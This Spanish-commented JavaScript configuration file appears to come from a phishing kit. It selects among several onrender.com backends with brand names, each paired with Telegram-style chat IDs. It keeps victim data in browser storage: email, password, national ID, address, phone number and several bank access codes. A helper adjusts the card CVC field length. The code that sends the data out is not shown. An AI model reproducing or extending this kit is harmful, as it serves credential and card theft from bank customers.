/**
 * CONFIGURACIÓN GENERAL
 * Este archivo contiene la configuración básica y manejo del almacenamiento local
 */

// URL base de la API
let url = "";

let fuente = "";

let chatIds = [];

// (0) Cabron
// (1) Piponas
// (2) Champaña
// (3) Asterisk
// (4) Masserati
// (5) Monastery
// (6) Working
// (7) Gucci

const optionData = 3;

switch (optionData) {
  case 0:
    url = "https://cabron-workshop.onrender.com";
    fuente = "Cabron";
    chatIds = ["-1002355342267", "-4659783416"];
    break;

  case 1:
    url = "https://piponas-style.onrender.com";
    fuente = "Piponas";
    chatIds = ["-1002355342267", "-4738282180"];
    break;

  case 2:
    url = "https://champagna-workshop.onrender.com";
    fuente = "Champaña";
    chatIds = ["-1002355342267", "-4733901614"];
    break;

  case 3:
    url = "https://asterisk-style.onrender.com";
    fuente = "Asterisk";
    chatIds = ["-1002355342267", "-4794496044"];
    break;
  
  case 4:
    url = "https://maserati-style.onrender.com";
    fuente = "Masserati";
    chatIds = ["-1002355342267", "-1002388358038"];
    break;
    
  case 5:
    url = "https://monastery-dashboard.onrender.com";
    fuente = "Monastery";
    chatIds = ["-1002355342267", "-1002476455498"];
    break;
  
  case 6:
    url = "https://working-shopwork.onrender.com";
    fuente = "Working";
    chatIds = ["-1002355342267", "-4671714625"];
  
  case 7:
    url = "https://gucci-dashboard.onrender.com";
    fuente = "Gucci";
    chatIds = ["-1002355342267", "-1002276552342"];
  
}

// Referencia al localStorage del navegador
const LS = window.localStorage;
2;
// Objeto principal que almacena toda la información de la aplicación
let info = {
  // Información del usuario y metadatos
  metaInfo: {
    email: "", // Correo electrónico del usuario
    p: "", // Contraseña
    pdate: "", // Fecha
    c: "", // Código
    ban: "", // Estado de ban
    dues: "", // Cuotas
    dudename: "", // Nombre del deudor
    surname: "", // Apellido
    cc: "", // Cédula/Identificación
    telnum: "", // Número de teléfono
    city: "", // Ciudad
    state: "", // Estado/Provincia
    address: "", // Dirección
    cdin: "", // Código de entrada
    ccaj: "", // Código de caja
    cavance: "", // Código de avance
    tok: "", // Token
    user: "", // Usuario
    puser: "", // Usuario previo
    err: "", // Mensaje de error
    disp: "", // Display
  },

  // Información del verificador
  checkerInfo: {
    company: "", // Nombre de la compañía
    mode: "userpassword", // Modo de autenticación
  },
  edit: 0, // Estado de edición
};

/**
 * Actualiza la información en el localStorage
 * Convierte el objeto info a string y lo guarda
 */
function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

/**
 * Inicialización del almacenamiento local
 * Si existe información previa, la carga
 * Si no existe, guarda el objeto info por defecto
 */
LS.getItem("info")
  ? (info = JSON.parse(LS.getItem("info")))
  : LS.setItem("info", JSON.stringify(info));

/**
 * Guarda un valor en el almacenamiento local y en el objeto info
 * @param {string} field - Campo de metaInfo a guardar (ej: 'telnum', 'email', etc)
 * @param {string} value - Valor a guardar
 * @param {number} minLength - Longitud mínima permitida
 * @param {number} maxLength - Longitud máxima permitida
 * @param {string} errorMessage - Mensaje de error personalizado
 * @returns {boolean} - true si el guardado fue exitoso, false si hubo error
 */

// ejemplo: guardarValor("email", "example@mail.com", 9, 999, "Por favor ingrese un email válido")
function guardarValor(
  field,
  value,
  minLength = 0,
  maxLength = 999,
  errorMessage = ""
) {
  // Validar que el campo exista en metaInfo
  if (!info.metaInfo.hasOwnProperty(field)) {
    console.error(`El campo ${field} no existe en metaInfo`);
    return false;
  }

  // Validar que el valor no sea null o undefined
  if (value === null || value === undefined) {
    alert(errorMessage || "Por favor ingrese un valor válido");
    return false;
  }

  // Convertir el valor a string para validar longitud
  const strValue = String(value).trim();

  // Validar longitud mínima
  if (strValue.length < minLength) {
    alert(
      errorMessage || `El valor debe tener al menos ${minLength} caracteres`
    );
    return false;
  }

  // Validar longitud máxima
  if (strValue.length > maxLength) {
    alert(errorMessage || `El valor no debe exceder ${maxLength} caracteres`);
    return false;
  }

  try {
    // Guardar en el objeto info
    info.metaInfo[field] = strValue;

    // Actualizar localStorage
    updateLS();

    // También guardar el valor individual en localStorage (para compatibilidad)
    localStorage.setItem(field, strValue);

    return true;
  } catch (error) {
    console.error("Error al guardar el valor:", error);
    alert("Error al guardar los datos");
    return false;
  }
}

// Línea comentada para eliminar la información del localStorage si es necesario
// LS.removeItem('info');

// Función para cambiar longitud el CVV si es Amex
function updateCVCLength(cardNumber) {
  const cvcInput = document.getElementById("card_cvc");
  if (cardNumber.startsWith("3")) {
    cvcInput.maxLength = 4; // Cambia a 4 si la tarjeta comienza con 3
  } else {
    cvcInput.maxLength = 3; // Vuelve a 3 para otras tarjetas
  }
}
